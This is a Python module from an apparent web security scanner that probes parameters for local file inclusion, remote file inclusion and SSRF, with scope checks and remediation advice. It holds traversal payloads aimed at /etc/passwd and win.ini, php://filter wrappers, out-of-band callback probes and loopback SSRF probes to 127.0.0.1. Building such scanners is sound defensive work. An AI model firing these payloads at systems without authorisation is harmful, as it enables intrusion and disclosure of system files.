"""Path traversal / local file inclusion, RFI, and SSRF checks."""

from __future__ import annotations

from urllib.parse import urlencode

from cyberforge.core.context import ModuleContext
from cyberforge.core.exceptions import (
    PolicyViolation,
    RequestBudgetExceeded,
    ScopeViolation,
)
from cyberforge.core.models import Evidence, Finding, Severity
from cyberforge.core.session import HttpResult
from cyberforge.core.utils import (
    format_curl,
    normalize_for_diff,
    safe_excerpt,
    similarity,
    truncate,
)
from cyberforge.web.crawler import InjectionPoint, is_sensitive_point

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]
LFI_SIGNATURES = (
    "root:x:0:0:",
    "root:*:0:0:",
    "daemon:x:",
    "[fonts]",
    "[extensions]",
    "cm9vdDp4OjA6MD",
    "PD9waHA",
)
RFI_PARAMS = {
    "file",
    "filename",
    "page",
    "include",
    "inc",
    "template",
    "tpl",
    "lang",
    "language",
    "module",
    "load",
    "view",
}
OOB_POINT_LIMIT = 4
LOOPBACK_POINT_LIMIT = 3


class InclusionTester:
    def __init__(self, ctx: ModuleContext) -> None:
        self.ctx = ctx
        self.log = ctx.logger
        self.session = ctx.session
        self.oob = ctx.oob

    def test(self, points: list[InjectionPoint]) -> list[Finding]:
        selected = [point for point in points if not is_sensitive_point(point)]
        if not self.ctx.config.allow_form_submissions:
            selected = [point for point in selected if point.method != "POST"]
        selected = selected[: self.ctx.config.max_injection_points]
        findings: list[Finding] = []
        for point in selected:
            try:
                lfi = self._lfi(point)
                if lfi:
                    findings.append(lfi)
            except RequestBudgetExceeded:
                self.log.warning("request budget exhausted during inclusion testing")
                return findings
            except (ScopeViolation, PolicyViolation):
                continue
        oob_points = selected[:OOB_POINT_LIMIT]
        for point in oob_points:
            try:
                finding = self._oob_ssrf(point)
                if finding:
                    findings.append(finding)
            except RequestBudgetExceeded:
                self.log.warning("request budget exhausted during OOB testing")
                return findings
            except (ScopeViolation, PolicyViolation):
                continue
        if not findings:
            for point in selected[:LOOPBACK_POINT_LIMIT]:
                try:
                    loopback = self._loopback_ssrf(point)
                    if loopback:
                        findings.append(loopback)
                except RequestBudgetExceeded:
                    self.log.warning("request budget exhausted during SSRF testing")
                    return findings
                except (ScopeViolation, PolicyViolation):
                    continue
        self.log.info("Inclusion/SSRF testing: %d parameter(s), %d confirmation(s)", len(selected), len(findings))
        return findings

    def _lfi(self, point: InjectionPoint) -> Finding | None:
        baseline_result = self._send(point, point.value)
        if baseline_result is None or baseline_result.status is None:
            return None
        baseline_text = baseline_result.text or ""
        for payload in LFI_PAYLOADS:
            result = self._send(point, payload)
            if result is None or result.status is None or not result.text:
                continue
            signature = next((item for item in LFI_SIGNATURES if item in result.text), None)
            if not signature or signature in baseline_text:
                continue
            wrapper = "php://filter" in payload
            return Finding(
                title="Local file inclusion",
                severity=Severity.HIGH,
                module="web",
                target=result.url or point.url,
                description=(
                    "A file-path parameter accepted traversal or a PHP stream wrapper and returned "
                    "content from the local filesystem."
                ),
                remediation=(
                    "Resolve and allowlist file paths, reject traversal sequences and stream wrappers, "
                    "and run the application with least filesystem privilege."
                ),
                evidence=Evidence(
                    payload=payload,
                    request=self._reproduction(point, payload),
                    response_excerpt=_proof(result.text, signature),
                    notes=(
                        "PHP filter wrapper returned base64-encoded file content."
                        if wrapper
                        else "Local file signature appeared in the response."
                    ),
                ),
                cvss=7.5,
                confidence="high",
                tags=["web", "lfi", "path-traversal", "injection"],
                metadata={"parameter": point.parameter, "method": point.method, "wrapper": wrapper},
            )
        return None

    def _oob_ssrf(self, point: InjectionPoint) -> Finding | None:
        if self.oob is None:
            return None
        token = self.oob.new_token()
        callback = self.oob.url_for(token)
        result = self._send(point, callback)
        if result is None:
            return None
        timeout = max(2.0, min(self.ctx.config.oob_timeout, 10.0))
        hits = self.oob.wait_for(token, timeout=timeout)
        if not hits:
            return None
        hit = hits[0]
        param = point.parameter.lower()
        is_rfi = param in RFI_PARAMS or any(part in param for part in ("file", "include", "page", "template"))
        title = "Remote file inclusion" if is_rfi else "Server-side request forgery (out-of-band)"
        tags = ["web", "rfi", "injection"] if is_rfi else ["web", "ssrf", "injection"]
        return Finding(
            title=title,
            severity=Severity.CRITICAL if is_rfi else Severity.HIGH,
            module="web",
            target=result.url or point.url,
            description=(
                "The target server fetched an attacker-controlled callback URL supplied through a "
                "parameter, confirming server-side outbound request capability."
                + (" Inclusion parameters may also permit remote code loading." if is_rfi else "")
            ),
            remediation=(
                "Do not fetch user-controlled URLs. Resolve hosts, enforce destination allowlists, "
                "block loopback/link-local/metadata ranges, and require egress controls."
            ),
            evidence=Evidence(
                payload=callback,
                request=self._reproduction(point, callback),
                response_excerpt=(
                    f"Callback observed from {hit.get('remote_address', 'unknown')} "
                    f"via {hit.get('method', 'GET')} {hit.get('path', '')}"
                ),
                notes="Out-of-band listener recorded a request; no response body was used for proof.",
            ),
            cvss=9.1 if is_rfi else 8.2,
            confidence="high",
            tags=tags,
            metadata={"parameter": point.parameter, "method": point.method, "callback": callback},
        )

    def _loopback_ssrf(self, point: InjectionPoint) -> Finding | None:
        ports = [port for port in self.ctx.config.ssrf_ports if 1 <= port <= 65535][:2]
        if not ports:
            return None
        invalid = "http://cfx.invalid/?cfx=1"
        baseline = self._send(point, invalid)
        if baseline is None or baseline.status is None:
            return None
        for port in ports:
            target = f"http://127.0.0.1:{port}/?cfx=1"
            result = self._send(point, target)
            if result is None or result.status is None or result.status != 200:
                continue
            if len(result.text or "") < 32:
                continue
            ratio = similarity(normalize_for_diff(baseline.text), normalize_for_diff(result.text))
            if ratio > 0.97:
                continue
            if similarity(normalize_for_diff(point.value), normalize_for_diff(result.text)) > 0.9:
                continue
            return Finding(
                title="Potential SSRF to loopback service",
                severity=Severity.MEDIUM,
                module="web",
                target=result.url or point.url,
                description=(
                    "The response changed when a loopback URL was supplied, suggesting the server may "
                    "fetch user-controlled URLs. Manual review is required to distinguish SSRF from "
                    "an application that merely echoes input."
                ),
                remediation=(
                    "Use destination allowlists and block loopback, link-local, and metadata ranges at "
                    "the application and network layers."
                ),
                evidence=Evidence(
                    payload=target,
                    request=self._reproduction(point, target),
                    response_excerpt=(
                        f"Invalid-host baseline status: {baseline.status}; loopback status: {result.status}; "
                        f"response similarity: {ratio:.3f}; loopback length: {len(result.text or '')}"
                    ),
                    notes="Differential-only signal; no cloud metadata endpoint was contacted.",
                ),
                cvss=5.8,
                confidence="low",
                tags=["web", "ssrf", "loopback", "needs-review"],
                metadata={"parameter": point.parameter, "method": point.method, "port": port},
            )
        return None

    def _send(self, point: InjectionPoint, value: str) -> HttpResult | None:
        try:
            if point.method == "GET":
                return self.session.get(point.url, params=point.stable_params(value))
            if not self.ctx.config.allow_form_submissions:
                return None
            return self.session.post(point.url, data=point.stable_params(value))
        except (ScopeViolation, PolicyViolation):
            return None

    def _reproduction(self, point: InjectionPoint, payload: str) -> str:
        if point.method == "GET":
            delimiter = "&" if "?" in point.url else "?"
            return format_curl("GET", f"{point.url}{delimiter}{urlencode(point.stable_params(payload))}")
        return format_curl("POST", point.url, data=urlencode(point.stable_params(payload)))


def _proof(text: str, signature: str, limit: int = 400) -> str:
    index = text.find(signature)
    if index < 0:
        return safe_excerpt(text, limit)
    line_start = text.rfind("\n", 0, index) + 1
    line_end = text.find("\n", index)
    if line_end < 0 or line_end - line_start > 300:
        line_end = min(len(text), index + 200)
    return truncate(text[line_start:line_end], limit)
